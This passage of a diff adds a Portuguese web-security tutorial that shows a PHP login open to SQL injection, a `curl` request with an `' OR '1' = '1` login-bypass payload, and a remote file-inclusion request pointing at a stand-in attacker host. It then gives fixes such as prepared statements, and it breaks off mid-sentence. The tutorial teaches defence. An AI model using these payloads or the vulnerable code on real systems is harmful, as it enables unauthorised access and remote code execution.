+    &lt;span class=&quot;token function&quot;&gt;mysql_select_db&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;exemplos_blog&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token comment&quot;&gt;// Faz a consulta ao banco, comparando usuário e senha&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;SELECT 1 FROM usuario WHERE usuario = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&apos; &quot;&lt;/span&gt;
+        &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;AND senha = &apos;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;Query inválida: &quot;&lt;/span&gt;
+        &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token function&quot;&gt;mysql_close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$link&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mysql_num_rows&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;// Vai para a página logada&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Login com sucesso&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;// Errou o usuário e senha, volta para a página de login&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Usuário e senha inválidos&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token comment&quot;&gt;// Vai para a página de login&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Levando em consideração que temos um usuário com nome &lt;code class=&quot;language-text&quot;&gt;teste&lt;/code&gt; e senha
+&lt;code class=&quot;language-text&quot;&gt;teste&lt;/code&gt;, se executarmos a instrução abaixo, será exibida uma mensagem
+de &lt;em&gt;login&lt;/em&gt; inválido:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl --data &amp;quot;usuario=foo&amp;amp;senha=bar&amp;quot; http://localhost/sql-injection.php
+
+Usuário e senha inválidos&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Evidente! Este usuário não existe no banco de dados. Mas, podemos
+imaginar que a aplicação não possua proteção contra injeções &lt;em&gt;SQL&lt;/em&gt;,
+então podemos fazer com que a consulta retorne positivo, e que nosso
+acesso seja garantido mesmo não possuindo um usuário no banco de dados.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl --data &amp;quot;usuario=foo&amp;amp;senha=bar&amp;#39; OR &amp;#39;1&amp;#39; = &amp;#39;1&amp;quot; http://localhost/sql-injection.php
+
+Login com sucesso&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;A nossa &lt;em&gt;query&lt;/em&gt;, por não fazermos um tratamento nos campos do
+formulário, foi composta pelo valor &lt;code class=&quot;language-text&quot;&gt;bar’ OR &amp;#39;1’ = ’1&lt;/code&gt;, o que resultou
+no seguinte &lt;em&gt;SQL&lt;/em&gt;:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;sql&quot;&gt;&lt;pre class=&quot;language-sql&quot;&gt;&lt;code class=&quot;language-sql&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; usuario
+&lt;span class=&quot;token keyword&quot;&gt;WHERE&lt;/span&gt; usuario &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;foo&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;AND&lt;/span&gt; senha &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;bar&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Existem algumas soluções para este problema, como o uso de
+&lt;code class=&quot;language-text&quot;&gt;addslashes&lt;/code&gt; no &lt;em&gt;PHP&lt;/em&gt;, mas os que fazem mais sentido para mim são:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;O uso da função &lt;code class=&quot;language-text&quot;&gt;mysql_real_escape_string&lt;/code&gt; para formatar dados
+antes de construir a &lt;em&gt;query&lt;/em&gt;;&lt;/li&gt;
+&lt;li&gt;O uso da classe &lt;code class=&quot;language-text&quot;&gt;mysqli&lt;/code&gt; para consultas a bancos de dados &lt;em&gt;MySQL&lt;/em&gt;,
+ao invés do uso das funções &lt;em&gt;mysql&lt;/em&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;A primeira é a mais prática de aplicarmos. No código anterior, bastaria
+formatar os valores na hora que são resgatados do &lt;em&gt;array&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;$_POST&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;      &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Com o &lt;strong&gt;mysqli&lt;/strong&gt;, precisamos fazer algumas alterações no código, como
+demonstrado abaixo:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;token shell-comment comment&quot;&gt;# sql-injection.php (com mysqli)&lt;/span&gt;
+
+    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;    &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;usuario&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;      &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;senha&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;token comment&quot;&gt;// Abre conexão com o banco de dados&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$mysqli&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;localhost&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;root&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;exemplos_blog&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;// Faz a consulta ao banco, comparando usuário e senha&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$mysqli&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;SELECT 1 FROM usuario WHERE usuario = ? &quot;&lt;/span&gt;
+            &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;AND senha = ?&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;bind_param&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;ss&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$usuario&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$senha&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;store_result&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;token variable&quot;&gt;$num_rows&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;num_rows&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;token variable&quot;&gt;$query&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$num_rows&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;token comment&quot;&gt;// Vai para a página logada&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Login com sucesso&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;token comment&quot;&gt;// Errou o usuário e senha, volta para a página de login&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;Usuário e senha inválidos&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token comment&quot;&gt;// Vai para a página de login&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Mas como o mundo não é feito só de &lt;em&gt;MySQL&lt;/em&gt;, se ocorrer de você utilizar
+um outro banco de dados, eu recomendo o uso da biblioteca &lt;a href=&quot;http://php.net/pdo&quot; title=&quot;Conheça a lib PDO do PHP&quot;&gt;&lt;em&gt;PDO&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Como o &lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/db/queries/&quot; title=&quot;Making queries&quot;&gt;&lt;em&gt;Django&lt;/em&gt; utiliza &lt;em&gt;ORM&lt;/em&gt;&lt;/a&gt;, e o &lt;a href=&quot;http://codeigniter.com/user_guide/database/active_record.html&quot; title=&quot;Active Record Class&quot;&gt;&lt;em&gt;Codeigniter&lt;/em&gt; tem a &lt;em&gt;Active
+Record Class&lt;/em&gt;&lt;/a&gt;, nesses &lt;em&gt;frameworks&lt;/em&gt; essa validação é feita no momento
+que interagimos com os seus &lt;em&gt;models&lt;/em&gt;. Mas é sempre bom ter cuidado!
+Principalmente quando o &lt;em&gt;ORM&lt;/em&gt; não atende o nosso requisito, e temos que
+partir para consultas &lt;em&gt;SQL&lt;/em&gt; puras.&lt;/p&gt;
+&lt;h3&gt;Senhas criptografadas&lt;/h3&gt;
+&lt;p&gt;Uma boa dica é, sempre que persistirmos um usuário em nossa base de
+dados, armazenarmos a sua senha criptografada em um formato “sem volta”
+(conhecido como &lt;em&gt;hash&lt;/em&gt;). Além de ser um princípio ético, que na minha
+opinião todo o desenvolver de aplicações deveria ter, garantimos que
+mesmo que a nossa aplicação seja invadida, as senhas dos usuários
+estarão “seguras”.&lt;/p&gt;
+&lt;p&gt;Embora o &lt;a href=&quot;http://pt.wikipedia.org/wiki/MD5&quot; title=&quot;Conheça o algoritmo MD5&quot;&gt;&lt;em&gt;MD5&lt;/em&gt;&lt;/a&gt; e o &lt;a href=&quot;http://pt.wikipedia.org/wiki/SHA1&quot; title=&quot;Conheça o algoritmo SHA1&quot;&gt;&lt;em&gt;SHA1&lt;/em&gt;&lt;/a&gt; sejam as escolhas mais populares, os
+desenvolvedores do &lt;em&gt;Django&lt;/em&gt; &lt;a href=&quot;https://docs.djangoproject.com/en/dev/releases/1.4/#improved-password-hashing&quot; title=&quot;Leia a release note do Django 1.4&quot;&gt;recomendam o uso de algoritmos mais sofisticados&lt;/a&gt;,
+como o &lt;a href=&quot;http://en.wikipedia.org/wiki/PBKDF2&quot; title=&quot;Conheça o algoritmo PBKDF2&quot;&gt;&lt;em&gt;PBKDF2&lt;/em&gt;&lt;/a&gt;, por acreditarem que o poder
+computacional atingiu um nível, que senhas &lt;em&gt;MD5&lt;/em&gt; e &lt;em&gt;SHA1&lt;/em&gt; podem com
+considerável esforço ser quebradas.&lt;/p&gt;
+&lt;h2&gt;PHP Injection (não confie no PHP)&lt;/h2&gt;
+&lt;p&gt;Embora esta técnica possa acontecer em outras linguagens, o &lt;em&gt;PHP&lt;/em&gt; dá
+muita margem para desenvolvedores menos experientes deixarem brechas
+para uma vulnerabilidade conhecida como &lt;strong&gt;&lt;em&gt;PHP
+Injection&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Com o site dividido em seções, é comum termos inclusões de arquivos
+&lt;em&gt;PHP&lt;/em&gt; para compor uma página. Para economizar esforço e linhas de
+código, deixamos as partes como menu e topo “estáticas”, e só alteramos
+o conteúdo do bloco principal da página. Acontece que em alguns casos, o
+desenvolvedor espera que um determinado arquivo seja importado de acordo
+com a &lt;em&gt;URL&lt;/em&gt; que o internauta está visitando. Por exemplo:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;php&quot;&gt;&lt;pre class=&quot;language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token php language-php&quot;&gt;&lt;span class=&quot;token delimiter important&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;token shell-comment comment&quot;&gt;# php-injection.php&lt;/span&gt;
+
+&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;topo.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token single-quoted-string string&quot;&gt;&apos;menu.php&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;token delimiter important&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Logo:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl http://localhost/php-injection.php?page=novidades.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;No caso acima, estamos incluindo o arquivo &lt;code class=&quot;language-text&quot;&gt;novidades.php&lt;/code&gt; e
+automaticamente exibindo o seu conteúdo. Podemos navegar por outras
+áreas do &lt;em&gt;website&lt;/em&gt;, por exemplo, &lt;code class=&quot;language-text&quot;&gt;page=contato.php&lt;/code&gt; ou
+&lt;code class=&quot;language-text&quot;&gt;page=institucional.php&lt;/code&gt;. Mas, e se informarmos
+&lt;code class=&quot;language-text&quot;&gt;page=php-injection.php&lt;/code&gt;?&lt;/p&gt;
+&lt;p&gt;Caímos num &lt;em&gt;looping&lt;/em&gt; infinito!&lt;/p&gt;
+&lt;p&gt;E, infelizmente, esse é o menor dos nossos problemas. O &lt;em&gt;PHP&lt;/em&gt;, quando
+configurado com a opção &lt;code class=&quot;language-text&quot;&gt;allow_url_include&lt;/code&gt; como &lt;code class=&quot;language-text&quot;&gt;TRUE&lt;/code&gt;, é capaz
+de importar arquivos de outros &lt;em&gt;hosts&lt;/em&gt;. Logo, o atacante pode ter um
+&lt;em&gt;script&lt;/em&gt; malicioso hospedado em seu servidor, e passar o caminho dele
+para a aplicação acima. A aplicação incluirá e interpretará o &lt;em&gt;PHP&lt;/em&gt; que
+estiver neste &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl http://localhost/php-injection.php?page=http://sitedoatacante.com.br/meu-script-malicioso.php.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Pronto! Temos código &lt;em&gt;PHP&lt;/em&gt; de outra pessoa executando em nosso servidor.&lt;/p&gt;
+&lt;p&gt;Para resolver este problema, configure a opção &lt;code class=&quot;language-text&quot;&gt;allow_url_include&lt;/code&gt;
+em seu &lt;code class=&quot;language-text&quot;&gt;php.ini&lt;/code&gt; como &lt;code class=&quot;language-text&quot;&gt;FALSE&lt;/code&gt;. Outro passo importante é, sempre que
+for importar algum arquivo que dependa de informações vindas do usuário,
+verifique o conteúdo desta informação. Exemplo:&lt;/p&gt;
